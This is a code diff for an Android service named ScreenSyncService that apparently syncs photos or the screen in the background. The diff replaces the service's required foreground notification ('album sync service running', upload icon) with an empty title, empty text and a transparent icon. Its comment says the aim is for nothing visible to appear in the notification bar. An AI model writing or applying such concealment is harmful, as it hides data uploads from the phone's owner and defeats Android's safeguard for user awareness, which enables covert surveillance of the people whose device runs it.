@@ -149,13 +149,14 @@ class ScreenSyncService : Service() {
             this, 0, openIntent,
             PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
         )
-        // 静默后台：不显示设备码/IP/进度等敏感信息，仅保留前台服务最小占位
+        // 完全隐藏：透明图标 + 空标题，通知栏不出现任何可见内容（前台服务强制占位）
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("相册同步服务运行中")
-            .setContentText("正在后台运行")
-            .setSmallIcon(android.R.drawable.stat_sys_upload)
+            .setContentTitle("")
+            .setContentText("")
+            .setSmallIcon(R.drawable.ic_sync_transparent)
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .setContentIntent(pi)
             .build()
     }
